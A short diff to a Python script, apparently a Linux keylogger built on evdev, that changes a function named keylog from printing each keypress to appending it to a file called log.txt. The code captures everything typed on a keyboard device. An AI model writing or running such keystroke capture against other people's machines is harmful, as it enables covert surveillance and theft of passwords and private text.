@@ -108,9 +108,10 @@ key_code_map = {
 
 
 async def keylog(dev):
-    async for event in dev.async_read_loop():
-        if event.type == ecodes.EV_KEY and event.value == 1:
-            print(key_code_map[event.code])
+    with open('log.txt', 'a+') as f:
+        async for event in dev.async_read_loop():
+            if event.type == ecodes.EV_KEY and event.value == 1:
+                f.write(key_code_map[event.code])
 
 
 if __name__ == "__main__":
